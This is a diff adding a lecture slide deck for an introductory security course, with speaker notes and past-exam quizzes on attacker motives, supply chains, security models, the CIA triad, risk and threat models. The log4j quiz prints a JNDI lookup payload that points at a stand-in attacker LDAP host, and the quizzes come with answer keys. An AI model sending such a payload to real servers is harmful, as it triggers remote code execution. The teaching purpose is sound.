@@ -1,0 +1,1094 @@
+import {
+  Flow,
+  Chapter,
+  Cols,
+  Mark,
+  Notes,
+  Part,
+  Quiz,
+  Reveal,
+  Slide,
+  Step,
+} from "../../../components/features/slides";
+
+<Part title="1 · Concepts">
+
+{/* ------------------------------------------------------------ Basic Concepts */}
+
+<Chapter title="The problem" label="Basic Concepts">
+
+<Slide title="Why security is hard">
+
+## Why security is hard
+
+<Reveal>
+
+- The software we run is **full of bugs**
+- **Social engineering** works very well
+- Finding vulnerabilities **pays**: one market for **exploits** (the way in), one for **malware** (control of the machines you got into)
+
+</Reveal>
+
+<Step at={4}>
+
+<div class="cards">
+<div class="card" data-color="orange">
+
+### up to $7M
+
+for one phone exploit, on a broker's price list
+
+</div>
+<div class="card" data-color="red">
+
+### ~$5M
+
+for a full zero-click Android chain
+
+</div>
+<div class="card" data-color="blue">
+
+### $83B → $272B
+
+security products market, 2016 → 2028
+
+</div>
+</div>
+
+</Step>
+
+<Notes>
+
+Let's start with why this course exists at all. Three reasons, and they're worth remembering because they show up in open questions.
+
+**[→]** Software has bugs. That's not going to change, and some of those bugs are vulnerabilities.
+
+**[→]** Social engineering works. It's often easier to fool a person than to break a system. The lecture's example is Anonymous attacking Portuguese targets.
+
+**[→]** And the one that makes it serious: vulnerabilities are worth money. There are two markets. Exploits are the way in. Malware is what you keep running once you're in, so you control the machine. And a third market grows around both: security products and services.
+
+**[→]** Just for scale: a phone exploit can sell for millions. You don't need these numbers for the test. You need the idea: someone will always be paid to find your bug.
+
+</Notes>
+</Slide>
+
+<Slide title="What attackers want">
+
+## What do attackers want?
+
+<Cols columns="1fr 1fr" gap={72}>
+<div>
+
+### From your machine
+
+<Reveal>
+
+1. **Your credentials**: spyware, banking trojans, Man-in-the-Browser (ZeuS); "legal" spyware like **Pegasus** (zero-click)
+2. **A ransom**: WannaCry, 2017
+3. **Your computing power**: crypto mining
+4. **Your network address**: spam, DoS, ad clicks, proxies (botnets)
+
+</Reveal>
+
+</div>
+<div>
+
+### From a server
+
+<Reveal start={5}>
+
+1. **Data breaches**: card numbers, credentials, personal data
+2. **Geopolitics**: Stuxnet, the Ukraine power grid, the DNC
+3. **To reach users**: supply chain (SolarWinds), infected web servers (MPack)
+
+</Reveal>
+
+</div>
+</Cols>
+
+<Notes>
+
+Why does anyone attack? The lecture splits targets into user machines and servers. Tests ask "which of these is not a motivation", so know both lists.
+
+On a user's machine: **[→]** number one is stealing credentials: bank, work, games. Spyware is code that looks legitimate but sends your data to the attacker. Man-in-the-Browser is malware living inside your browser, between you and your bank, usually installed through phishing. ZeuS was the classic one and, around 2009, the largest botnet. Pegasus is the "legal" version, sold to governments, and it's zero-click: you don't have to tap anything.
+
+**[→]** Two, ransomware: encrypt or lock the machine and ask for money. WannaCry in May 2017 used a vulnerability that a government agency knew about. It was disclosed, and three weeks later a worm, meaning self-replicating malware, was all over the world.
+
+**[→]** Three, stealing processing power, like mining crypto. **[→]** Four, using your network address so the attacker looks like a normal user: spam, denial of service, clicking ads. All of this is sold online and usually needs a botnet.
+
+On servers: **[→]** data breaches, **[→]** geopolitics, like Stuxnet sabotaging centrifuges or the attack on Ukraine's power grid, **[→]** and using the server as a stepping stone to reach its users. That's the supply chain, next slide.
+
+</Notes>
+</Slide>
+
+<Slide title="Question: motivations">
+
+<Quiz
+  source="Test 1, 2023/24"
+  options={[
+    "To use the machine for a cyber theft ring.",
+    "To steal user credentials.",
+    "To demand a ransom on the data.",
+    "To perform a typo-squatting attack.",
+  ]}
+  correct={3}
+>
+
+Which is **not** a common motivation for malware to compromise a user machine?
+
+<div slot="answer">
+
+Typosquatting is a **method** (a fake package with a near-identical name), not a goal you'd have for someone's laptop.
+
+</div>
+</Quiz>
+
+<Notes>
+
+Pause and pick one.
+
+**[→]** It's d. Typosquatting is a way of spreading malware through a software repository. It's how you get in, not what you want from the machine. Credentials, ransom, and using the machine as part of a criminal operation are all on the list we just saw.
+
+The 2024 resit asked the server version: which is not a common motivation to compromise a server? The odd one out was "to force software updates on the server". Stealing users' credentials, supply-chain attacks and spreading false information are all real motivations.
+
+</Notes>
+</Slide>
+
+<Slide title="Supply chain">
+
+## Supply-chain attacks
+
+<Cols columns="1.1fr 1fr" gap={80}>
+<div>
+
+| fake | real |
+| --- | --- |
+| <code>setup<Mark at={1} type="circle">-</Mark>tools</code> | `setuptools` |
+| <code>url<Mark at={1} type="circle">l</Mark>ib</code> | `urllib3` |
+| `crypt` | `crypto` |
+| `django-server` | `django-server-guardian-api` |
+
+<p class="small muted">Typosquatting on PyPI.</p>
+
+</div>
+<div>
+
+<Reveal start={2}>
+
+- **SolarWinds**: malware inside a legitimate update of a monitoring tool, installed by thousands of customers
+- **MPack**: a toolkit that turns a hacked web server into a trap for the browsers that visit it
+
+</Reveal>
+
+</div>
+</Cols>
+
+<Notes>
+
+A supply-chain attack hides the malware inside something you already trust.
+
+The simplest case is typosquatting. Someone publishes a package to PyPI with a name almost identical to a popular one. **[→]** An extra hyphen, a missing letter. You make one typo in `pip install` and you've installed malware.
+
+**[→]** SolarWinds is the big one. Attackers got into the company that builds a network monitoring tool and put malware in its update. Customers installed a signed, legitimate update, and got the malware with it. **[→]** And MPack is the web-server version: compromise a server and use it to attack every vulnerable browser that visits.
+
+So a supply-chain attack can trick developers into installing malware, compromise servers that distribute software, or even compromise hardware. A 2025 question listed those three, and the answer was "all options are correct".
+
+</Notes>
+</Slide>
+
+<Slide title="Any error can compromise a system">
+
+## Any error can compromise a system
+
+<Flow
+  items={[
+    "Any error",
+    "Someone will find it",
+    "There is a market|illegal · grey zone · legal",
+  ]}
+  highlight={[2]}
+/>
+
+<Step at={1}>
+
+<p class="big">The legal market: <strong>bug bounties</strong>. HackerOne pays from about <strong>$200</strong> (low) to <strong>$25k</strong> (critical); zero-day bounties pay more.</p>
+
+</Step>
+
+<Notes>
+
+This is the first lecture in one line. Any error can compromise the system, someone will find it, and there is a market for it. Illegal, grey zone, like brokers that only sell zero-days to governments, or legal.
+
+**[→]** The legal one is bug bounties: a company pays you to report the flaw to them instead of selling it. Severity is scored with CVSS and the payout grows with it.
+
+Why do companies run bug bounties? This was a resit question. The answer was: to reduce the impact of zero-days. If the bug is reported to you first, you patch it before anyone uses it against you. The wrong options were corporate espionage, preventing bugs from being discovered, which is the opposite, and advertising.
+
+</Notes>
+</Slide>
+
+<Slide title="Question: zero-day">
+
+<Quiz
+  source="Test 1, 2024/25"
+  options={[
+    "Explores an unknown vulnerability.",
+    "Explores a recently published but not yet fixed vulnerability.",
+    "Does not require any user intervention, also known as zero-click.",
+    "Explores calendar issues during leap years.",
+  ]}
+  correct={0}
+>
+
+A **zero-day** attack is devastating because it:
+
+<div slot="answer">
+
+The vendor has had **zero days** to fix it: no patch, no antivirus signature. In 2023/24 the same idea was worded "its exploit was never publicly known before".
+
+</div>
+</Quiz>
+
+<Notes>
+
+Pause and think.
+
+**[→]** It's a. Zero-day means the vendor has had zero days to fix it, because nobody on the defending side knows it exists. There's no patch and no signature to detect it, so it works against everyone until it's found. That's why zero-days are so expensive.
+
+Watch out for b: once a vulnerability is published, it's no longer a zero-day. It's a known, unpatched vulnerability. And c is a different concept: zero-click means no user interaction is needed.
+
+The 2023 test asked "which property defines a zero-day?" and the correct option was "its exploit was never publicly known before". Not "no one in the world knows it exists": the attacker knows.
+
+</Notes>
+</Slide>
+
+</Chapter>
+
+<Chapter title="Security and the adversary" label="Basic Concepts">
+
+<Slide title="What secure means">
+
+## What does "secure" mean?
+
+<Reveal>
+
+> "A system that remains **dependable in the face of malice**." <span class="muted" style="white-space:nowrap">· Ross Anderson</span>
+
+> "Software security is about **integrating security practices into the way you build software**, not integrating security features into your code." <span class="muted" style="white-space:nowrap">· Gary McGraw</span>
+
+</Reveal>
+
+<Step at={3}>
+
+<p class="big">Security is <strong>relative</strong> (who defines it?), changes with <strong>context</strong>, and is defined in the <Mark at={4} type="box" color="orange">negative</Mark>: bad things can't happen.</p>
+
+</Step>
+
+<Notes>
+
+"The system behaves as expected" is the usual first try, and it's not enough: it says nothing about what the system must not do. There is no universal definition.
+
+**[→]** Ross Anderson's version: dependable in the face of malice. Someone is actively trying to break it. **[→]** Gary McGraw's is about process: security is how you build the software, not a feature you bolt on. The second quote was a wrong option in a test about adversarial thinking, so know which idea is which.
+
+**[→]** Three properties. Relative: "secure" alone means nothing, it depends on who defines it and how. Context: the meaning changes for software, systems, web, networks, which is why the course has those parts. **[→]** And negative. Showing that something happens is easy: you test it. Showing that bad things never happen means thinking of everything an attacker could try. That's much harder.
+
+</Notes>
+</Slide>
+
+<Slide title="Actors and adversaries">
+
+## Actors, trust and the adversary
+
+<Cols columns="1fr 1fr" gap={72}>
+<div>
+
+<Reveal>
+
+- **Actors**: people, organizations, machines. Security is defined from their point of view.
+- We **trust** some of them (a Trusted Third Party). The system is "secure" **if those assumptions hold**. If not? **Defense in depth**.
+- The **adversary**: an actor who **intends** to misuse the system or deny it to others.
+
+</Reveal>
+
+</div>
+<div>
+
+<Step at={4}>
+
+### Know your adversary
+
+Motivation · capabilities · access
+
+<p class="muted">script kiddies → occasional attackers → malicious attackers → organized cybercrime → business competitors → states</p>
+
+<Mark at={5} type="underline" color="red">No system beats every attacker.</Mark>
+
+</Step>
+
+</div>
+</Cols>
+
+<Notes>
+
+**[→]** Actors are whoever takes part in the system. Security is always defined from someone's perspective.
+
+**[→]** We have to trust something: a trusted third party, a component, an administrator. Then "secure" really means "secure if these assumptions hold". The lecture's follow-up is: what if they don't? That's why we stack defenses, defense in depth, so one broken assumption isn't the end.
+
+**[→]** The adversary is an actor who wants to misuse the system or deny it to others. Some are outside, some are inside.
+
+**[→]** You can't defend against "an attacker" in general. You describe them by motivation, capabilities and access, from script kiddies, curious but ineffective, up to governments.
+
+**[→]** Because no system is secure against all of them. You pick who you defend against. That's the threat model, which we'll define properly in a few slides.
+
+</Notes>
+</Slide>
+
+<Slide title="Adversarial thinking">
+
+## Adversarial thinking
+
+<Reveal>
+
+- The attacker always finds the **weakest link**
+- So: **identify and question your security assumptions**
+- Look at the system "out of the box": a developer is stuck on what the system *should* do
+- Get someone outside to try: an external **pentest**
+
+</Reveal>
+
+<Step at={5}>
+
+<div class="cards" style="--n:2">
+<div class="card" data-color="orange">
+
+### Strava
+
+A public heatmap of runs showed the outline of secret military bases.
+
+</div>
+<div class="card" data-color="red">
+
+### A dam's control panel
+
+A web interface on the Internet and a weak password: four hours inside, undetected.
+
+</div>
+</div>
+
+</Step>
+
+<Notes>
+
+**[→]** The attacker doesn't attack your strongest wall. They look for the weakest link.
+
+**[→]** So the core habit is questioning assumptions. "Nobody will find this URL." "Only our app talks to this API." Each of these is a place to attack.
+
+**[→]** Developers think about what the system is supposed to do. An attacker thinks about everything else it can be made to do. **[→]** Which is why an outside pentest finds things the team doesn't.
+
+**[→]** Two examples from the lecture. Strava's fitness app published a global heatmap of workouts. Nobody attacked anything: soldiers jogging around bases drew the bases on the map. The assumption "location data is harmless" was wrong. And the dam: an operational control panel reachable from the Internet with a single weak password. Every other control was bypassed, and there are thousands of systems exposed like that.
+
+</Notes>
+</Slide>
+
+<Slide title="Question: adversarial thinking">
+
+<Quiz
+  source="Test 1, 2023/24"
+  options={[
+    "Defining security from the perspective of the various attackers.",
+    "Integrating secure development practices into the way you build software.",
+    "Questioning the security assumptions and understanding how to break a system.",
+    "Analysing and balancing the risk / cost of possible attacks.",
+  ]}
+  correct={2}
+>
+
+Which statement is more precise? Adversarial thinking is about:
+
+</Quiz>
+
+<Notes>
+
+Pause.
+
+**[→]** It's c. Adversarial thinking is thinking like the attacker: question the assumptions and work out how to break the system.
+
+b is McGraw's definition of software security. d is risk management. a sounds close, but security is defined from the perspective of the actors, and the attackers are only some of them.
+
+</Notes>
+</Slide>
+
+</Chapter>
+
+{/* ------------------------------------------------------------ Security Model */}
+
+<Chapter title="Two models of security" label="Security Model">
+
+<Slide title="Correctness and security">
+
+## Correctness ⊂ Security
+
+<p class="big"><strong>Correctness:</strong> good input → good output.</p>
+
+<p class="big"><strong>Security:</strong> <Mark at={1} color="red">bad</Mark> input → no bad output.</p>
+
+<Step at={2}>
+
+Integrity: the data stays trustworthy. Confidentiality: sensitive data is not revealed. And "bad behavior" is a huge space, hard to even measure.
+
+</Step>
+
+<Notes>
+
+Correctness is what normal testing checks: you give a valid user and a date, you get that user's history for that date.
+
+**[→]** Security is about the other inputs. The malicious ones, which you didn't plan for. Bad input must not produce bad output.
+
+**[→]** "Bad output" means things like the data no longer being trustworthy, or sensitive data leaking. And the space of bad inputs is enormous. That's why security contains correctness: a secure program has to be correct, and more.
+
+</Notes>
+</Slide>
+
+<Slide title="Binary vs risk management">
+
+## Two models of security
+
+<div class="cards" style="--n:2">
+<div class="card" data-color="blue">
+
+### Binary
+
+**Secure or not.** Define the attacker's capabilities **X** and the goals **Y**, then prove no attacker limited to X breaks Y.
+
+<p class="muted">Cryptography, dependable systems. Words: <strong>security proof</strong>, <strong>secure by design</strong>.</p>
+
+<Step at={1}>
+<p class="small">✗ doesn't scale · model ≠ real system · ignores side channels</p>
+</Step>
+
+</div>
+<div class="card" data-color="green">
+
+### Risk management
+
+**More or less secure.** Minimize the risk of the **likely** threats; weigh the cost of defenses against the losses.
+
+<p class="muted">Software engineering, real systems. Words: <strong>resilience</strong>, <strong>mitigation</strong>, <strong>risk</strong>, <strong>security engineering</strong>.</p>
+
+<Step at={2}>
+<p class="small">✗ the risk analysis may be wrong · a missed threat = big exposure</p>
+</Step>
+
+</div>
+</div>
+
+<Notes>
+
+This slide has been asked in four different tests, so learn the vocabulary on it.
+
+The binary model says a system is either secure or not. You write down formally what the attacker can do and what they must not achieve, and you prove it. That's the world of cryptography. Its words are "security proof" and "secure by design".
+
+Risk management says "more secure or less secure". You focus on the likely threats and spend on defense only where it's worth it. Its words are "resilience", "mitigation", "risk", "security engineering".
+
+**[→]** Limits of binary: it doesn't scale to complex systems, your abstract model isn't the real system, and formal models can miss real problems like side channels.
+
+**[→]** Limits of risk management: your analysis can be wrong, and you're never really "secure". The lecture's example is the Death Star: one threat catalogued as negligible, a small exhaust port, and the whole thing blows up.
+
+Exam traps: "formal security proof" is binary, so it's "not associated with risk management". "Resilience" is risk management, so it's "not associated with the binary model". "The binary model advocates security by design" is true.
+
+</Notes>
+</Slide>
+
+<Slide title="Question: security models">
+
+<Quiz
+  source="Test 1, 2024/25"
+  options={[
+    "Security engineering.",
+    "Formal security proof.",
+    "Mitigation.",
+    "Resilience.",
+  ]}
+  columns={2}
+  correct={1}
+>
+
+Which term is **not** associated to the risk management security model?
+
+<div slot="answer">
+
+Proofs belong to the **binary** model. The 2025 resit asked the mirror question: the binary model advocates "defining and proving security goals for clearly defined attacker capabilities".
+
+</div>
+</Quiz>
+
+<Notes>
+
+Pause.
+
+**[→]** b, formal security proof. That's the binary model. The other three are on the risk management side of the previous slide.
+
+The 2025 resit flipped it: what does the binary model advocate? Defining and proving security goals for clearly defined attacker capabilities. The trap there was "developing once-and-for-all proofs that the system is secure": the proof only holds against the attacker you defined.
+
+</Notes>
+</Slide>
+
+<Slide title="The security lifecycle">
+
+## Security is a cycle, not a state
+
+<Flow
+  items={[
+    "An attacker finds a new attack",
+    "A defender finds a new defense",
+    "Repeat|even after the system is retired",
+  ]}
+/>
+
+<Step at={1}>
+
+<p class="big">Binary: <strong>longer</strong> cycles · Risk management: <strong>shorter</strong> cycles</p>
+
+</Step>
+
+<Step at={2}>
+
+<p class="big">Always a compromise between <strong>security</strong>, <strong>functionality</strong> and <strong>usability</strong>; the job is <strong>paranoia</strong> balanced by <strong>rationality</strong>.</p>
+
+</Step>
+
+<Notes>
+
+Security is a process. Attackers find a new attack, defenders respond, attackers adapt. The best you can get is a balance over time. And it doesn't stop when the system is switched off: think of an electronic voting system, where old votes must stay secret for years.
+
+**[→]** The two models fit here. A binary proof takes a long time to build and lasts a long time: long cycles. Risk management reacts quickly with smaller fixes: short cycles.
+
+**[→]** And every decision is a trade-off between security, functionality and usability. Maximum security usually means a system nobody can use. That's why the lecture calls the job paranoia plus rationality: assume the worst, then spend effort where it actually matters.
+
+</Notes>
+</Slide>
+
+</Chapter>
+
+<Chapter title="CIA and risk" label="Security Model">
+
+<Slide title="CIA">
+
+## The properties: CIA (and two more)
+
+<div class="cards" style="--n:3">
+<div class="card" data-color="blue">
+
+### Confidentiality
+
+Prevent unauthorized **access** to information. Secrecy.
+
+</div>
+<div class="card" data-color="green">
+
+### Integrity
+
+Prevent unauthorized **changes** to information, a process or a function.
+
+</div>
+<div class="card" data-color="orange">
+
+### Availability
+
+Prevent unauthorized **denial of service** to others.
+
+</div>
+</div>
+
+<Step at={1}>
+
+<div class="cards" style="--n:2">
+<div class="card" data-color="purple">
+
+### Authenticity
+
+"Origin integrity": prevent impersonating someone else.
+
+</div>
+<div class="card" data-color="magenta">
+
+### Privacy
+
+A person's right to control who learns their personal data, **including activity metadata**.
+
+</div>
+</div>
+
+</Step>
+
+<Notes>
+
+The three axes. "What does the CIA triad stand for?" has been asked word for word. Confidentiality, Integrity, Availability. Not Authentication: that's the trap option.
+
+Confidentiality: nobody unauthorized can read it. Integrity: nobody unauthorized can change it. The lecture's examples are raising your bank balance without depositing, or getting snacks from a vending machine without paying: the machine's process was tampered with. Availability: nobody can stop legitimate users from using it. Breaking an ATM, or a network DoS.
+
+**[→]** Two extras. Authenticity, which the lecture calls origin integrity: using someone else's bank credentials to take their money is an authenticity failure. And privacy, which is not the same as secrecy. Secret from whom? Your bank knows your balance, that's fine. Privacy is about your control over it, and it includes metadata. Your location history alone tells someone where you live, work and sleep.
+
+</Notes>
+</Slide>
+
+<Slide title="Alarm clock">
+
+## Your alarm clock: which property is violated?
+
+<div class="cards" style="--n:3">
+<div class="card">
+
+### Someone unplugs it
+
+<Step at={1}>
+<span class="pill" style="--c: var(--c-orange)">Availability</span>
+</Step>
+
+</div>
+<div class="card">
+
+### Someone changes the time
+
+<Step at={2}>
+<span class="pill" style="--c: var(--c-green)">Integrity</span>
+</Step>
+
+</div>
+<div class="card">
+
+### Someone hides a camera in your room
+
+<Step at={3}>
+<span class="pill" style="--c: var(--c-blue)">Confidentiality and privacy</span>
+</Step>
+
+</div>
+</div>
+
+<Step at={4}>
+
+<p class="big">Ask <strong>what the attacker did</strong>: read → C · changed → I · stopped → A</p>
+
+</Step>
+
+<Notes>
+
+This is the lecture's own example, and it's the style of the multiple-choice questions. Try each one.
+
+Unplugged while you sleep. **[→]** Availability: the alarm isn't there when you need it. That's a denial of service.
+
+The time was changed. **[→]** Integrity: the clock's data no longer matches reality.
+
+A hidden camera. **[→]** Confidentiality, and privacy: private information is exposed without consent.
+
+**[→]** The trick works on any scenario: ask what the attacker did to the information.
+
+</Notes>
+</Slide>
+
+<Slide title="Trade-offs between C, I and A">
+
+## Improving one usually costs another
+
+<Reveal>
+
+- **+C** Disconnect from the Internet → **−I** updates arrive late
+- **+I** Heavy manual validation → **−C** more people see the data, **−A** data is "frozen" while checked
+- **+A** Geo-distributed cloud → **−C** reachable from the Internet, **−I** data in transit can be tampered with
+
+</Reveal>
+
+<Notes>
+
+The lecture calls these absurd examples, but they show a real point: CIA is always a compromise.
+
+**[→]** Cut the system off the Internet and confidentiality goes up, but you stop getting security updates, so integrity suffers.
+
+**[→]** Validate every change by hand and integrity goes up. But more people now look at the data, and the data is stuck while it waits.
+
+**[→]** Spread your service across clouds around the world and availability goes up. But it's exposed to the whole Internet, and data travelling between sites can be modified.
+
+</Notes>
+</Slide>
+
+<Slide title="Risk">
+
+## Risk = impact × probability
+
+<Cols columns="1fr 1.1fr" gap={80} align="center">
+<div>
+
+<Reveal>
+
+- **Asset**: anything with value to an actor: information, reputation, money, infrastructure
+- Risk = losing that value through a loss of **C**, **I** or **A**
+- Sometimes **accepting** the risk is cheaper: card fraud yes, a nuclear attack no
+
+</Reveal>
+
+</div>
+<div>
+
+<Step at={4}>
+
+| probability ↓ · impact → | low | medium | high |
+| --- | --- | --- | --- |
+| **high** | low | medium | <Mark at={5} type="circle" color="red">high</Mark> |
+| **medium** | low | medium | medium |
+| **low** | low | low | low |
+
+</Step>
+
+</div>
+</Cols>
+
+<Notes>
+
+Risk management treats security as a cost question: how much would the attack cost me, and how much would the defense cost?
+
+**[→]** First, what are we protecting? An asset is any resource with value: information, reputation, money, infrastructure.
+
+**[→]** The risk is that the asset loses its value: by unauthorized access, which is C, unauthorized change, which is I, or downtime, which is A.
+
+**[→]** And sometimes you accept the risk. Banks accept some credit card fraud because stopping all of it would cost more. Nobody accepts the risk of a nuclear attack.
+
+**[→]** The risk matrix has two axes: the probability of the threat and the impact on the asset. Tests ask exactly that: "the rows and columns of a risk assessment matrix correspond to probability of occurrence and level of severity". Not cost of mitigation: that's what you decide after you read the matrix.
+
+**[→]** Only high probability with high impact is high risk. If either one is low, the risk is low. A method to find the threats in the first place is STRIDE.
+
+</Notes>
+</Slide>
+
+</Chapter>
+
+<Chapter title="Vulnerability, attack, threat" label="Security Model">
+
+<Slide title="Vulnerability, attack, threat">
+
+## The words that always come up
+
+<Cols columns="1.2fr 1fr" gap={72}>
+<div>
+
+<Reveal>
+
+- **Vulnerability**: a latent failure **an adversary can reach**. Often unintended: bad code, bad requirements, misconfiguration, wrong use.
+- **Attack**: an attempt to **exploit** a vulnerability. Passive (eavesdropping) or active (guessing passwords, DoS). If it works, the system is **compromised**.
+- **Threat**: a **possible incident** with negative consequences. Classified by **kind** and by **origin**.
+
+</Reveal>
+
+</div>
+<div>
+
+<Step at={4}>
+
+### Example
+
+A client talks to a site over plain HTTP.
+
+- vulnerability: no **HTTPS**
+- threat: a **man-in-the-middle**
+- passive attack: read the traffic
+
+</Step>
+
+</div>
+</Cols>
+
+<Notes>
+
+These three words are in almost every test, so let's be precise.
+
+**[→]** A vulnerability is a failure that's latent, waiting, and that an adversary can actually reach. A bug nobody can trigger from outside isn't a vulnerability. It's usually not intentional.
+
+**[→]** An attack is someone trying to exploit it. Passive means observing, like eavesdropping. Active means doing something: guessing passwords, flooding the service. A successful attack means the system is compromised.
+
+**[→]** A threat is a possible incident that would hurt. Kind: physical damage, loss of service, a data breach, technical failure, abuse of features. Origin: deliberate, negligent, accidental, environmental. So a natural disaster is a threat. A competitor or an activist is a threat.
+
+**[→]** The lecture's example: the site doesn't use HTTPS, that's the vulnerability. Someone sitting in the middle of the connection is the threat. Reading the client's data as it passes is a passive attack.
+
+</Notes>
+</Slide>
+
+<Slide title="MOM">
+
+## An attack needs MOM
+
+<div class="cards" style="--n:3">
+<div class="card" data-color="red">
+
+### Motive
+
+= the **threat**
+
+DoS, tampering, theft of information, a natural disaster
+
+</div>
+<div class="card" data-color="orange">
+
+### Opportunity
+
+= the **vulnerability**
+
+something that can be exploited
+
+</div>
+<div class="card" data-color="green">
+
+### Method
+
+= the **exploit**
+
+the way to exploit it
+
+</div>
+</div>
+
+<Step at={1}>
+
+<p class="big">Who catalogs what: <strong>CWE</strong> (weakness types) · <strong>CVE</strong> (concrete vulnerabilities) · <strong>Exploit-DB</strong>, Rapid7 (exploits)</p>
+
+</Step>
+
+<Notes>
+
+A handy way to keep the words apart: an attack needs MOM. Motive is the threat. Opportunity is the vulnerability. Method is the exploit, the code or technique that actually uses the vulnerability.
+
+**[→]** New vulnerabilities appear every day, so there's a community process to manage them: identify, classify, disclose, detect, mitigate, eliminate. And each word has its catalog. The lecture lists CWE on the threat side: it's the Common Weakness Enumeration, a list of types of weakness, like "buffer overflow". CVE is a list of concrete vulnerabilities in specific products, each with a number, like the CVEs you'll see later. And Exploit-DB collects working exploits.
+
+</Notes>
+</Slide>
+
+<Slide title="Question: classify">
+
+<Quiz source="Midterm, 2021/22" at={1}>
+
+Classify each one: **1** threat, **2** vulnerability, **3** exploit.
+
+<div class="cards small" style="--n:4">
+<div class="card">an activist who disagrees with the company <Step at={1} inline><span class="pill">1</span></Step></div>
+<div class="card">a message causing an out-of-bounds read on the heap <Step at={1} inline><span class="pill">2</span></Step></div>
+<div class="card">a competing company <Step at={1} inline><span class="pill">1</span></Step></div>
+<div class="card">an integer overflow in a buffer size <Step at={1} inline><span class="pill">2</span></Step></div>
+<div class="card">a natural disaster <Step at={1} inline><span class="pill">1</span></Step></div>
+<div class="card">use after free <Step at={1} inline><span class="pill">2</span></Step></div>
+<div class="card">JavaScript that does heap spraying <Step at={1} inline><span class="pill" style="--c: var(--c-red)">3</span></Step></div>
+<div class="card">forgetting a security update <Step at={1} inline><span class="pill">2</span></Step></div>
+</div>
+
+<div slot="answer">
+
+Threat = **who or what** could cause harm. Vulnerability = a **weakness** of the system. Exploit = the attacker's **code or technique**.
+
+</div>
+</Quiz>
+
+<Notes>
+
+From the 2021 midterm. Pause and classify all eight.
+
+**[→]** Threats are agents or events that could cause harm: the activist, the competitor and the natural disaster.
+
+Vulnerabilities are weaknesses in the system: the out-of-bounds read, the integer overflow, the use after free, and forgetting an update. That last one is a trap: it's not an attack, it's a weakness someone can use.
+
+The exploit is the attacker's code: JavaScript doing heap spraying. We'll see what that is in the software part. The 2023 resit asked "which is not usually a threat?" with the same list, and the answer was the heap-spraying JavaScript.
+
+</Notes>
+</Slide>
+
+<Slide title="Question: log4j">
+
+<Quiz
+  source="Resit, 2023/24"
+  options={["V=3+4; A=2+5; T=1", "V=3+5; A=1+2; T=4", "V=1+4; A=3; T=2+5", "V=5; A=1+2; T=3+4"]}
+  columns={2}
+  correct={0}
+>
+
+Classify the **log4j** incident into (V)ulnerability, (A)ttack and (T)hreat:
+
+<ol class="small">
+<li>An attacker</li>
+<li>puts a JNDI lookup, <code>$&#123;jndi:ldap://evil/x&#125;</code>, in an HTTP header</li>
+<li>the server passes the header to log4j to be logged</li>
+<li>log4j processes the string and queries the attacker's LDAP server</li>
+<li>which answers with a malicious Java class that the server runs</li>
+</ol>
+
+</Quiz>
+
+<Notes>
+
+This one is a style of question that keeps coming back: a diagram of a real incident, and you sort the steps. Log4j was a logging library in almost every Java server.
+
+**[→]** The answer is a. The threat is the actor: step 1, the attacker. The attack is what the attacker does: step 2, sending the malicious string, and step 5, delivering the code that runs. The vulnerability is the weakness in the server: step 3, logging untrusted input without care, and step 4, the library interpreting that input and fetching code from wherever it says.
+
+The method: the attacker's actions are the attack, the attacker is the threat, and whatever the system does wrong on its own is the vulnerability. The 2025 resit asked the same thing about ShellShock, and the latent vulnerability was again the server's own processing steps.
+
+</Notes>
+</Slide>
+
+<Slide title="Question: the security cycle">
+
+<Quiz
+  source="Test 1, 2024/25"
+  options={[
+    "A=Zero-Days; B=Threats; C=Exploits; D=Assets",
+    "A=Threats; B=Vulnerabilities; C=Risks; D=Assets",
+    "A=Perimeter; B=Risks; C=Threats; D=Policy",
+    "A=Vulnerabilities; B=Assets; C=Malware; D=System",
+  ]}
+  columns={2}
+  correct={1}
+>
+
+How can we fill this security cycle?
+
+<div class="cycle" style="--cols:5">
+<b>A<Step at={1} inline> · Threats</Step></b><i>materialised by →</i><b>Attacks</b><i>exploit →</i><b>B<Step at={1} inline> · Vulnerabilities</Step></b>
+<i>↑ compromised by</i><span></span><span></span><span></span><i>expose to ↓</i>
+<b>D<Step at={1} inline> · Assets</Step></b><i>← protect</i><b>Countermeasures</b><i>← mitigated by</i><b>C<Step at={1} inline> · Risks</Step></b>
+</div>
+
+</Quiz>
+
+<Notes>
+
+This cycle ties all the words together, and it was a test question. Try to fill A to D before I click.
+
+**[→]** Threats are materialised by attacks. Attacks exploit vulnerabilities. Vulnerabilities expose you to risks. Risks are mitigated by countermeasures. Countermeasures protect assets. And assets are compromised by threats, which closes the loop. So it's b.
+
+If you get stuck on a question like this, read each arrow as a sentence. "Attacks exploit ___": only vulnerabilities fits.
+
+</Notes>
+</Slide>
+
+</Chapter>
+
+<Chapter title="Threat model, policy, mechanism" label="Security Model">
+
+<Slide title="Threat model and perimeter">
+
+## Threat model and security perimeter
+
+<Cols columns="1fr 1fr" gap={72}>
+<div>
+
+### Threat model
+
+<Reveal>
+
+- **Goals**: which assets, protected from whom?
+- **Adversaries**: motivation, capabilities, access
+- **Attacks** we must protect against
+- **Scope**: attacks we can ignore
+
+</Reveal>
+
+</div>
+<div>
+
+<Reveal start={5}>
+
+- **Security perimeter**: the border of a context with one security level. **Every input from outside is suspicious.**
+- **Attack surface**: the points of contact with the outside, inside the perimeter
+
+</Reveal>
+
+</div>
+</Cols>
+
+<Notes>
+
+A threat model is the written answer to four questions. **[→]** What are we protecting, and from whom? **[→]** Who are the adversaries? **[→]** Which attacks do we have to stop? **[→]** And which ones are out of scope? Saying what you ignore is part of the model.
+
+**[→]** The security perimeter is the border around everything at the same trust level, and the rule is: anything crossing it is suspicious. You'll see this in every attack in the course. A buffer overflow is input from outside the perimeter that was trusted. So is SQL injection.
+
+**[→]** The attack surface is every point where the outside touches the inside: every input field, open port, API, file you parse. Fewer of those, fewer ways in.
+
+</Notes>
+</Slide>
+
+<Slide title="Policy and mechanism">
+
+## Policy = what · Mechanism = how
+
+<Cols columns="1fr 1fr" gap={80}>
+<div>
+
+### Security policy
+
+The processes and mechanisms that must be in place to be secure **under a given threat model**.
+
+Goals: **prevention**, **detection**, **recovery**.
+
+<p class="muted">physical · access control · passwords · email · remote access</p>
+
+</div>
+<div>
+
+### Security mechanism
+
+A method, tool or procedure that implements (part of) a policy. **It can be non-technical.**
+
+<p class="muted">authentication (biometrics, one-time passwords) · access control (RBAC) · cryptography · physical control (vaults, turnstiles) · auditing (pentests)</p>
+
+</div>
+</Cols>
+
+<Notes>
+
+A classic distinction. The policy says what has to be guaranteed: for example, a password policy, or "only employees enter the building". Its goals can be prevention, detection, recovery, or a mix.
+
